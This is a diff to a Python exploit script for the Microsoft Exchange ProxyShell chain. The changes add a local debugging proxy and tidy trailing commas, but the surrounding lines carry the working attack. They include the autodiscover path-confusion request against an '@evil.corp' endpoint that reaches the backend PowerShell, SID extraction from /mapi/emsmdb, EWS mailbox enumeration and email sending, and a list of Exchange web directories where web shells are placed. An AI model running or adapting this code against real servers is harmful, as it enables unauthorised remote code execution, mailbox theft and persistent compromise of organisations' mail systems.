@@ -18,6 +18,9 @@ from pypsrp.powershell import PowerShell, RunspacePool
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
 from functools import partial
+from requests_toolbelt.utils import dump
+
+proxies = {"https":"http://127.0.0.1:8080"}
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
@@ -73,7 +76,7 @@ class PwnServer(BaseHTTPRequestHandler):
         r = self.proxyshell.post(
             powershell_url,
             post_data,
-            headers
+            headers,
         )
 
         resp = r.content
@@ -109,8 +112,7 @@ class ProxyShell:
         r = self.session.post(
             url=url,
             data=data,
-            headers=headers
-
+            headers=headers,
         )
         return r
     def get_fqdn(self):
@@ -123,7 +125,7 @@ class ProxyShell:
             exit(0)
         except Exception as f:
             print(self.exchange_url + f' {f}')
-            exit(0)   
+            exit(0)
         return self.fqdn
     def get_token(self):
         self.token = self.gen_token()
@@ -135,7 +137,7 @@ class ProxyShell:
         t = requests.get(
             self.exchange_url+'/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp'.format(endpoint="/powershell/?X-Rps-CAT="+self.token),
             headers={"Cookie": f"PrivateComputer=true; ClientID={self.cid}-BD342960067874C8; X-OWA-JS-PSD=1","User-Agent": self.ua},
-            verify=False
+            verify=False,
             )
         if t.status_code == 200:
             return self.token
@@ -160,7 +162,7 @@ class ProxyShell:
             r = self.post(
                 '/mapi/emsmdb',
                 data,
-                headers
+                headers,
             )
 
             self.sid = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
@@ -194,7 +196,7 @@ class ProxyShell:
             r = self.post(
                 f'/EWS/exchange.asmx',
                 data=data,
-                headers=headers
+                headers=headers,
             )
             first_email = re.findall('(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)', r.text)
             for self.email in first_email:
@@ -208,7 +210,7 @@ class ProxyShell:
                 r_legacydn = self.post(
                     '/autodiscover/autodiscover.xml',
                     autodiscover_payload,
-                    headers={"Content-Type": "text/xml"}
+                    headers={"Content-Type": "text/xml"},
                     )
                 if r_legacydn.status_code == 200 and 'Legacy' in r_legacydn.text:
                     print(f'+ {self.email}')
@@ -270,7 +272,7 @@ class ProxyShell:
             p = self.post(
                 '/ews/exchange.asmx',
                 data=send_email,
-                headers={"Content-Type":"text/xml"}
+                headers={"Content-Type":"text/xml"},
                 )
             d = p.text.split('ResponseClass="')[1].split('"')[0] + f" with subject {subj_}"
             return d
@@ -374,7 +376,7 @@ def main():
     shell_path_force = [
         "inetpub\\wwwroot\\aspnet_client\\",
         "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\",
-        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\", 
+        "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\",
         "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\scripts\\",
         "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\scripts\\premium\\",
         "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\",
